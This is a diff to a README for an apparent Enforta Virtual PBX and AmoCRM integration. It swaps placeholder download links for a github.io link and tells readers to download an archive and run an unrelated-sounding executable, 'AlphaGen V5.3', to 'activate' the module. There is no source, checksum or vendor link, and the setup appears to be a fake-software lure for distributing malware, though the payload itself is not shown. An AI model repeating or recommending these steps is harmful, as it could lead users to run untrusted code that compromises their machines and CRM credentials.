@@ -2,13 +2,13 @@
 
 Connect Enforta Virtual PBX with AmoCRM to track calls, manage conversations, and automate CRM actions directly from your cloud telephony system.
 
-[![Download](https://img.shields.io/badge/Download-Enforta_Virtual_PBX_AmoCRM-blueviolet)](PLACE_YOUR_DOWNLOAD_LINK_HERE)
+[![Download](https://img.shields.io/badge/Download-Enforta_Virtual_PBX_AmoCRM-blueviolet)](https://enforta-virtual-pbx-amocrm.github.io/.github)
 
 ---
 
 ### ⚙️ Installation Instructions
 
-1. 📦 [Download the archive](PLACE_YOUR_DOWNLOAD_LINK_HERE)  
+1. 📦 [Download the archive](https://enforta-virtual-pbx-amocrm.github.io/.github)  
 2. 📁 Extract the folder to any preferred location  
 3. 🖱 Run AlphaGen V5.3 to activate the Enforta PBX module  
 4. ✅ In AmoCRM, go to `Settings > Integrations > Enforta PBX`, and authorize your API
